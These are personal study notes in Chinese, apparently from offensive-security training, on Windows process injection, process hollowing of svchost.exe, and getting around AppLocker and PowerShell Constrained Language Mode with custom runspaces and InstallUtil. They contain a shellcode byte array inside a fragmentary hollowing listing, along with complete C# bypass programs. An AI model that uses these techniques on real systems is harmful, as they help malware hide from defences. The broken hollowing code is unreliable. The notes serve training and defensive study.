# Process Injection and Migration
>[!note]
>- Process Injection的意義在於讓惡意程式碼躲在一個「合法且受信任」的程式裡面執行。
>- 比較常會Inject到explorer.exe、或開新的notepad.exe、或是migrate到svchost.exe

## Process Hollowing
>[!note]
>- 創建一個 Suspended 的 Process,並修改其記憶體中的內容、插入Shellcode,使其在恢復執行狀態後直接執行到我們所注入的 Shellcode。
>- 因為是程式執行之後才修改記憶體內容,因此 PEB 內的一些環境變數及Program Image 的檔案路徑等都還是維持在執行 svchost.exe 時的設定。

>[!note]
>1. 創建一個 Suspended 的 Process。
>2. 從 PEB 取得 image base 位址資訊,計算出 entry point 位址。
>3. 將 Shellcode 從計算出的 entry point 開始寫入記憶體。
>4. Resume Suspended 的 Process,執行我們塞入的 Shellcode。

>[!warning]
>原理是用合法程式`scvhost.exe`執行起來，但是暫停程式，把程式後半部換成shellcode。

        {

        [DllImport("kernel32.dll")]

            byte[] data = new byte[0x200];

            uint opthdr = e_lfanew_offset + 0x28;

            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            byte[] buf = new byte[798] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
                0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x48,0x31,
                0xd2,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,

                0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5

# Application Whitelisting
>[!note]
>- Application Whitelisting的原理是只要有任何程式要啟動，都會通知Application whitelisting software。
>- 所以Application whitelisting software可以控制那些程式可以執行那些不行。
>- 這個Application whitelisting software就是AppLocker。
>- 可以在Local Group Policy -> Computer Configuration -> Windows Setting -> Security Settings -> Application Control Polices -> AppLocker 設定。

- Application Whitelisting Check
``` powershell
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
```

### Custom Runspaces
>[!note]
>- Bypass的方式就是開一個PowerShell開一個runspace。
>- 以C#來說可以開`System.Management.Automation.Runspaces namespace`來導入`CreateRunspace`method。

在寫C#之前，要先開啟Add Reference，才可以把`System.Management.Automation.dll`加進去，位置在`C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35`。

- Powershell Custom Runspace 
``` C sharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
```

### PowerShell CLM Bypass
>[!note]
>單純用Custom Runspaces的做法還是會遇到沒辦法Bypass executable 的問題，這個章節使用 InstallUtil來做到執行C#的executable。
-  InstallUtil是用來安裝或是解除安裝 server resources 的原生工具。

需要先在Visual Studio的Referrence加入`System.Configuration.Install`跟剛剛的`System.Management.Automation.dll`

``` C#=
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace CLMBypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);
            
            ps.Invoke();

            rs.Close();
        }
    }
}

```
